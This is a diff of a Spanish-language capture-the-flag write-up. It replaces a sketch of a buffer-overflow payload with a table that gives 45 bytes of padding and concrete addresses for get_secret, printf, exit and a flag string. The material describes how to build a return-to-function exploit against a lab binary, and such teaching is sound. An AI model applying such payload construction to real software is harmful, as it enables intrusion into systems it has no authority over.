@@ -132,12 +132,13 @@ En la pila tiene que quedar algo como esto antes de llamar al ret de get_secret:
 
 El payload quedaría así gráficamente:
 ```
-|45*A		|
-|get_secret	|
-|printf		|
-|exit		|
-|addr_fl4g	|
-|_______________|
+| Pila          | Función     |
+| ------------- |:-----------:| 
+| 45*A          | offset      | 
+| 0x080489a0    | get_secret  | 
+| 0x0804f0a0    | printf      |
+| 0x0804e660    | exit        |
+| 0x080eca2d    | addr fl4g   |
 ```
 
 Archivo final para explotar:
